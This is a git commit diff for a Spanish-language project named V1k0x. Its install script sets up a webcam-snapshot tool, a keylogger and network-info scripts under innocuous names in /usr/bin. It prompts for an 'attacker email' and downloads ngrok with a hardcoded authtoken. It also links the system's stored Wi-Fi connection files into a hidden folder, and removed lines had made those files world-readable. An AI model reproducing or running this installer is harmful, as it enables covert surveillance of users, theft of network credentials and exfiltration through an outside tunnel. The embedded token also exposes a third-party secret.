f0479724cfbafed6be1a3ac58c40020362b2e782
r4yX <108579252+r4yX@users.noreply.github.com>
2022-11-15 20:44:32 -0300

    Add files via upload

--- README.md
+++ README.md
@@ -1,6 +1,6 @@
 # V1k0x
 
-Para instalar V1k0x : 
+Para instalar V1k0x en Debian: 
 git clone https://github.com/r4yx/v1k0x && cd v1k0x && sudo chmod +x ./install && sudo ./install.sh
 
 Funcionalidades : 
--- install.sh
+++ install.sh
@@ -4,26 +4,19 @@ root_verify=$(whoami)
 usuario=$(users)
 
 function init_program() {
-    # Paquetes requeridos
-    python3.7 -m pip install pyautogui pynput
-    sudo apt-get install fswebcam netcat
-
-    # Instalacion
-    sudo chmod +r /etc/NetworkManager/system-connections/*
-
     sudo touch /usr/bin/observer.sh
     sudo touch /usr/bin/chisec.sh
     sudo touch /usr/bin/fingerstalker.sh
-    #sudo touch /usr/bin/netinfo.sh
-    sudo mv /exploits/bamby.sh /usr/bin
+    sudo touch /usr/bin/netinfo.sh
+    sudo touch /usr/bin/bamby.sh
     sudo echo "python3.7 /home/$usuario/.v1kox/0v53rber/cam_snap.py" > /usr/bin/observer.sh
     sudo echo "python3.7 /home/$usuario/.v1kox/ch1s3c/hb.py" > /usr/bin/chisec.sh
     sudo echo "python3.7 /home/$usuario/.v1kox/f1ng3r5talk3r/keylogger.py" > /usr/bin/fingerstalker.sh
-    #sudo echo "python3.7 /home/$usuario/.v1kox/n3t1nfo/netinfo.py" > /usr/bin/netinfo.sh
+    sudo echo "python3.7 /home/$usuario/.v1kox/n3t1nfo/netinfo.py" > /usr/bin/netinfo.sh
     sudo chmod +x /usr/bin/observer.sh
     sudo chmod +x /usr/bin/chisec.sh
     sudo chmod +x /usr/bin/fingerstalker.sh
-    #sudo chmod +x /usr/bin/netinfo.sh
+    sudo chmod +x /usr/bin/netinfo.sh
     sudo chmod +x /usr/bin/bamby.sh
 
     echo -e "Email Atacante >> "
@@ -41,10 +34,13 @@ function init_program() {
     mv exploits/ch1s3c/ ../.v1kox
     mv exploits/f1ng3r5talk3r/ ../.v1kox
     mv exploits/n3t1nfo/ ../.v1k0x
+    mv exploits/b4mby/ ../.v1kox
     sudo mv exploits/config.txt /usr/bin/
+    cd ../.v1kox && wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz && tar -xf ngrok-v3-stable-linux-amd64.tgz && rm ngrok-v3-stable-linux-amd64.tgz && chmod +x ngrok && ./ngrok config add-authtoken 2HVxiT0TNhWg7cqgjyW6o6i3Kvd_7QWwyBiG2Vc3AQX5fYU6K
 
     clear
 
+    ln -s /etc/NetworkManager/system-connections /home/$usuario/.v1k0x/
     python3.7 /home/$usuario/v1k0x/add.py
     echo -e "[+] Instalacion completada con exito. "
     
